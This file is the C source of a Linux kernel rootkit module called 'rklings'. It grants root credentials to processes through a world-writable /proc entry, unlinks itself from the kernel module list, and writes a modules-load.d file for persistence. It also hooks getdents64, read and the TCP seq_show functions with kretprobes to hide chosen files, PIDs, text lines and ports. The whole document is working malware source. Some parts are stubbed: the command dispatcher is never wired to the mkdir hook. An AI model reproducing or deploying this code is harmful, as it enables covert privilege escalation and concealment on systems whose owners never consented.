// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#define RK_TARGET_MAX    32
#define RK_NAME_MAX      64
#define SEQ_START_TOKEN  ((void *)1)
#define PERSIST_PATH     "/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR  "rklings"

/* ------------------------------------------------------------------ */
/* Target list                                                        */
/* ------------------------------------------------------------------ */

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list file_targets;
static struct rk_target_list pid_targets;
static struct rk_target_list content_targets;
static struct rk_target_list port_targets;

static int rk_target_add(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (list->count >= RK_TARGET_MAX) {
		ret = -ENOSPC;
		goto out;
	}
	strscpy(list->targets[list->count], name, RK_NAME_MAX);
	list->count++;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static int rk_target_remove(struct rk_target_list *list, int idx)
{
	unsigned long flags;
	int ret = 0;

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		ret = -EINVAL;
		goto out;
	}
	if (idx < list->count - 1) {
		memmove(&list->targets[idx], &list->targets[idx + 1],
			(list->count - idx - 1) * RK_NAME_MAX);
	}
	list->count--;
out:
	spin_unlock_irqrestore(&list->lock, flags);
	return ret;
}

static bool rk_target_match(struct rk_target_list *list, const char *name)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strcmp(list->targets[i], name) == 0) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

static bool rk_line_matches(struct rk_target_list *list,
			    const char *line, int len)
{
	unsigned long flags;
	bool found = false;
	int i;

	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count; i++) {
		if (strnstr(line, list->targets[i], len)) {
			found = true;
			break;
		}
	}
	spin_unlock_irqrestore(&list->lock, flags);
	return found;
}

static void rk_target_init(struct rk_target_list *list)
{
	spin_lock_init(&list->lock);
	list->count = 0;
}

/* ------------------------------------------------------------------ */
/* Credential escalation                                              */
/* ------------------------------------------------------------------ */

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

/* ------------------------------------------------------------------ */
/* PID escalation via /proc/rklings                                   */
/* ------------------------------------------------------------------ */

static pid_t escalate_pid;
static struct proc_dir_entry *proc_entry;

static int rk_proc_show(struct seq_file *m, void *v)
{
	if (escalate_pid)
		seq_printf(m, "pending: %d\n", escalate_pid);
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf,
			     size_t count, loff_t *ppos)
{
	// PID reads trigger escalation check
	struct task_struct *task;
	struct cred *new_cred;

	if (!escalate_pid)
		return count;

	task = pid_task(find_vpid(escalate_pid), PIDTYPE_PID);
	if (!task) {
		escalate_pid = 0;
		return count;
	}

	new_cred = prepare_kernel_cred(&init_task);
	if (new_cred) {
		commit_creds(new_cred);
		escalate_pid = 0;
	}

	return count;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open    = rk_proc_open,
	.proc_read    = seq_read,
	.proc_write   = rk_proc_write,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
};

/* ------------------------------------------------------------------ */
/* Module cloaking                                                    */
/* ------------------------------------------------------------------ */

static struct list_head *saved_mod_list;

static void rk_cloak(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

static void rk_uncloak(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

/* ------------------------------------------------------------------ */
/* Persistence                                                        */
/* ------------------------------------------------------------------ */

static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

static int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	// Best effort removal
	return 0;
}

/* ------------------------------------------------------------------ */
/* Getdents64 filter (files and PIDs)                                 */
/* ------------------------------------------------------------------ */

struct getdents_data {
	void __user *ubuf;
	int fd;
};

static bool should_hide_dirent(const char *name)
{
	if (rk_target_match(&file_targets, name))
		return true;
	if (rk_target_match(&pid_targets, name))
		return true;
	return false;
}

static int getdents_entry(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct getdents_data *data;

	data = (struct getdents_data *)ri->data;
	data->fd = (int)regs->di;
	data->ubuf = (void __user *)regs->si;
	return 0;
}

static int getdents_return(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	struct getdents_data *data;
	struct linux_dirent64 *d;
	long total, off, new_total;
	char *kbuf;

	data = (struct getdents_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_total = total;
	while (off < new_total) {
		d = (struct linux_dirent64 *)(kbuf + off);
		if (should_hide_dirent(d->d_name)) {
			long remaining = new_total - off - d->d_reclen;

			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + d->d_reclen,
					remaining);
			new_total -= d->d_reclen;
		} else {
			off += d->d_reclen;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

/* ------------------------------------------------------------------ */
/* Read filter (content lines)                                        */
/* ------------------------------------------------------------------ */

struct read_data {
	void __user *ubuf;
	size_t count;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;

	data = (struct read_data *)ri->data;
	data->ubuf = (void __user *)regs->si;
	data->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct read_data *data;
	long total, new_total;
	char *kbuf, *pos;

	data = (struct read_data *)ri->data;
	total = regs_return_value(regs);
	if (total <= 0)
		return 0;

	if (content_targets.count == 0)
		return 0;

	kbuf = kmalloc(total, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, data->ubuf, total)) {
		kfree(kbuf);
		return 0;
	}

	pos = kbuf;
	new_total = total;

	while (pos < kbuf + new_total) {
		char *nl = memchr(pos, '\n', (kbuf + new_total) - pos);
		int line_len;

		if (nl)
			line_len = nl - pos + 1;
		else
			line_len = (kbuf + new_total) - pos;

		if (rk_line_matches(&content_targets, pos, line_len)) {
			long remaining = (kbuf + new_total) - (pos + line_len);

			if (remaining > 0)
				memmove(pos, pos + line_len, remaining);
			new_total -= line_len;
		} else {
			pos += line_len;
		}
	}

	if (new_total != total) {
		if (copy_to_user(data->ubuf, kbuf, new_total))
			new_total = -EFAULT;
		regs_set_return_value(regs, new_total);
	}

	kfree(kbuf);
	return 0;
}

/* ------------------------------------------------------------------ */
/* TCP seq_show filter (ports)                                        */
/* ------------------------------------------------------------------ */

struct tcp_show_data {
	struct seq_file *seq;
	int saved_count;
	struct sock *sk;
};

static int tcp_show_entry(struct kretprobe_instance *ri,
			  struct pt_regs *regs)
{
	struct tcp_show_data *data;

	data = (struct tcp_show_data *)ri->data;
	data->seq = (struct seq_file *)regs->di;
	data->saved_count = data->seq->count;
	data->sk = (struct sock *)regs->si;
	return 0;
}

static int tcp_show_return(struct kretprobe_instance *ri,
			   struct pt_regs *regs)
{
	struct tcp_show_data *data;
	struct inet_sock *inet;
	unsigned short sport;
	char port_str[8];

	data = (struct tcp_show_data *)ri->data;

	if (data->sk == SEQ_START_TOKEN)
		return 0;

	inet = inet_sk(data->sk);
	sport = ntohs(inet->inet_sport);
	snprintf(port_str, sizeof(port_str), "%u", sport);

	if (rk_target_match(&port_targets, port_str))
		data->seq->count = data->saved_count;

	return 0;
}

/* ------------------------------------------------------------------ */
/* Mkdir command dispatcher                                           */
/* ------------------------------------------------------------------ */

static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	// Handled by command dispatch below
	return 0;
}

// Command prefix after "rklings."
static int __maybe_unused rk_dispatch(const char *cmd)
{
	int idx;

	// Escalation
	if (strcmp(cmd, "e") == 0)
		return rk_escalate();

	// PID escalation
	if (strncmp(cmd, "p.", 2) == 0) {
		pid_t pid;

		if (kstrtoint(cmd + 2, 10, &pid) == 0) {
			escalate_pid = pid;
			return 0;
		}
		return -EINVAL;
	}

	// Module cloaking
	if (strcmp(cmd, "cloak") == 0) {
		rk_cloak();
		return 0;
	}
	if (strcmp(cmd, "uncloak") == 0) {
		rk_uncloak();
		return 0;
	}

	// Persistence
	if (strcmp(cmd, "persist") == 0)
		return rk_persist();
	if (strcmp(cmd, "unpersist") == 0)
		return rk_unpersist();

	// File hiding
	if (strncmp(cmd, "h.f.", 4) == 0)
		return rk_target_add(&file_targets, cmd + 4);
	if (strncmp(cmd, "u.f.", 4) == 0) {
		if (kstrtoint(cmd + 4, 10, &idx) == 0)
			return rk_target_remove(&file_targets, idx);
		return -EINVAL;
	}

	// PID hiding
	if (strncmp(cmd, "h.i.", 4) == 0)
		return rk_target_add(&pid_targets, cmd + 4);
	if (strncmp(cmd, "u.i.", 4) == 0) {
		if (kstrtoint(cmd + 4, 10, &idx) == 0)
			return rk_target_remove(&pid_targets, idx);
		return -EINVAL;
	}

	// Content hiding
	if (strncmp(cmd, "h.c.", 4) == 0)
		return rk_target_add(&content_targets, cmd + 4);
	if (strncmp(cmd, "u.c.", 4) == 0) {
		if (kstrtoint(cmd + 4, 10, &idx) == 0)
			return rk_target_remove(&content_targets, idx);
		return -EINVAL;
	}

	// Port hiding
	if (strncmp(cmd, "h.p.", 4) == 0)
		return rk_target_add(&port_targets, cmd + 4);
	if (strncmp(cmd, "u.p.", 4) == 0) {
		if (kstrtoint(cmd + 4, 10, &idx) == 0)
			return rk_target_remove(&port_targets, idx);
		return -EINVAL;
	}

	return -ENOENT;
}

/* ------------------------------------------------------------------ */
/* Kretprobe definitions                                              */
/* ------------------------------------------------------------------ */

static struct kretprobe mkdir_probe = {
	.handler       = mkdir_return,
	.entry_handler = mkdir_entry,
	.maxactive     = 20,
	.kp.symbol_name = "__x64_sys_mkdir",
};

static struct kretprobe getdents_probe = {
	.handler       = getdents_return,
	.entry_handler = getdents_entry,
	.data_size     = sizeof(struct getdents_data),
	.maxactive     = 20,
	.kp.symbol_name = "__x64_sys_getdents64",
};

static struct kretprobe read_probe = {
	.handler       = read_return,
	.entry_handler = read_entry,
	.data_size     = sizeof(struct read_data),
	.maxactive     = 20,
	.kp.symbol_name = "ksys_read",
};

static struct kretprobe tcp4_probe = {
	.handler       = tcp_show_return,
	.entry_handler = tcp_show_entry,
	.data_size     = sizeof(struct tcp_show_data),
	.maxactive     = 20,
	.kp.symbol_name = "tcp4_seq_show",
};

static struct kretprobe tcp6_probe = {
	.handler       = tcp_show_return,
	.entry_handler = tcp_show_entry,
	.data_size     = sizeof(struct tcp_show_data),
	.maxactive     = 20,
	.kp.symbol_name = "tcp6_seq_show",
};

/* ------------------------------------------------------------------ */
/* Module init / exit                                                  */
/* ------------------------------------------------------------------ */

static int __init rk_init(void)
{
	int ret;

	rk_target_init(&file_targets);
	rk_target_init(&pid_targets);
	rk_target_init(&content_targets);
	rk_target_init(&port_targets);

	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry)
		return -ENOMEM;

	ret = register_kretprobe(&mkdir_probe);
	if (ret)
		goto fail_mkdir;

	ret = register_kretprobe(&getdents_probe);
	if (ret)
		goto fail_getdents;

	ret = register_kretprobe(&read_probe);
	if (ret)
		goto fail_read;

	ret = register_kretprobe(&tcp4_probe);
	if (ret)
		goto fail_tcp4;

	ret = register_kretprobe(&tcp6_probe);
	if (ret)
		goto fail_tcp6;

	return 0;

fail_tcp6:
	unregister_kretprobe(&tcp4_probe);
fail_tcp4:
	unregister_kretprobe(&read_probe);
fail_read:
	unregister_kretprobe(&getdents_probe);
fail_getdents:
	unregister_kretprobe(&mkdir_probe);
fail_mkdir:
	proc_remove(proc_entry);
	return ret;
}

static void __exit rk_exit(void)
{
	rk_uncloak();
	unregister_kretprobe(&tcp6_probe);
	unregister_kretprobe(&tcp4_probe);
	unregister_kretprobe(&read_probe);
	unregister_kretprobe(&getdents_probe);
	unregister_kretprobe(&mkdir_probe);
	proc_remove(proc_entry);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings local control milestone");
